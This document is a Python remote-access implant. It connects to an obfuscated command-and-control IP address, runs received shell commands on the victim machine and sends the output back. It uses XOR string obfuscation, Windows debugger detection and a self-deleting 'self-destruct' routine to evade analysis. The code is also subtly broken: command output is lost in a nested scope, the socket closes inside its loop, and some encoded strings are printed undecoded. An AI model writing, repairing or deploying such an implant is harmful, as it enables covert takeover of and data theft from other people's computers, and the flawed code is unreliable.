import socket
import subprocess
import base64
import os
import sys
import ctypes
import threading

current_dir = os.path.abspath(os.getcwd())

def obfuscate( data , key = 0x42 ):
    '''
    Perform XOR based obfuscation given data and key
    '''
    return ''.join( chr( ord( char ) ^ key ) for char in data )

#Obfuscate the status strings
STR_SELF_DESTRUCT = "1'.$o&'1607!6" #bitwise XOR of msg - "self-destruct" with 0x42
STR_DEBUGGER_DETECTED = "\x06' 7%%'0b&'6'!6'&nb+,+6+#6+,%b1'.$o&'1607!6l" #bitwise XOR of msg - "debugger detected" with 0x42
STR_SELF_DESTRUCT_INITIATED = "\x11'.$o&'1607!6b1'37',!'b+,+6+#6'&l" #bitwise XOR of msg - "Self-destruct sequence initiated." with 0x42
STR_SELF_DESTRUCT_FAILED = "\x11'.$b&'1607!6b$#+.'&" #bitwise XOR of msg - "Self-destruct failed" with 0x42
STR_COMMAND_RECEIVED = "\x10'!'+4'&b!-//#,&" #bitwise XOR of msg - "Received command" with 0x42
STR_SENDING_OUTPUT = "\x11',&+,%b-76276" #bitwise XOR of msg - "Sending output" with 0x42
STR_CONNECTED_TO_SERVER = "\x01-,,'!6'&b6-b\x01pb1'04'0" #bitwise XOR of msg - "Connected to C2 server" with 0x42
STR_COMMAND_TOOK_LONG = "\x01-//#,&b6--)b6--b.-,%b6-b':'!76'" #bitwise XOR of msg - "Command took too long to execute" with 0x42
STR_HOST = "qvlppvluslw{" #bitwise XOR of C2 IP
STR_CD = "\x01*#,%'&b&+0'!6-0;b6-b"#bitwise XOR of Changed directory to

def check_debugger():
    '''
    Check if the code is being run under debugger in Windows target machine
    '''
    try:
        return ctypes.windll.kernel32.IsDebuggerPresent() != 0
    except AttributeError:
        return False

def execute_command( cmd ):
    '''
    Execute the given command line instruction.
    '''
    output = obfuscate( STR_COMMAND_TOOK_LONG )

    def target():
        global current_dir  # Declare the use of the global variable
        if cmd.startswith("cd "):
            os.chdir(os.path.join(current_dir, cmd[3:]))
            current_dir = os.path.abspath(os.getcwd())
            output = "Changed directory to " + current_dir
        else:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)
            out, err = process.communicate()
            output = out.decode() + err.decode()

    thread = threading.Thread( target = target )
    thread.start()
    thread.join( timeout = 10 )
    if thread.is_alive():
        thread.join()  # Make sure to clean up if still running
    return output


def send_all( sock , data ):
    '''
    Send result to C2 server
    '''
    xor_encoded_data = obfuscate( data , key = 0x20 )
    data_length = str( len( xor_encoded_data ) ).zfill( 10 )
    sock.send( data_length.encode() + xor_encoded_data.encode() )

def self_destruct():
    '''
    Destroy the file in which this function resides
    '''
    print( STR_SELF_DESTRUCT_INITIATED )
    os.remove( sys.argv[ 0 ] )
    sys.exit()

def main():
    '''
    Main entry function for implant
    '''
    host = obfuscate( STR_HOST  )
    port = 9999
    if check_debugger():
        print( STR_DEBUGGER_DETECTED )
        self_destruct()

    s = socket.socket()
    s.connect( ( host, port ) )
    print( STR_CONNECTED_TO_SERVER )
    
    while True:
        encoded_cmd = s.recv( 4096 ).decode().strip()
        if not encoded_cmd:
            break

        cmd = base64.b64decode( encoded_cmd ).decode()
        if cmd == obfuscate( STR_SELF_DESTRUCT ):
            self_destruct()

        print( STR_COMMAND_RECEIVED )
        output = execute_command( cmd )
        print( STR_SENDING_OUTPUT )
        send_all( s , output )
        s.close()

if __name__ == '__main__':
    main()
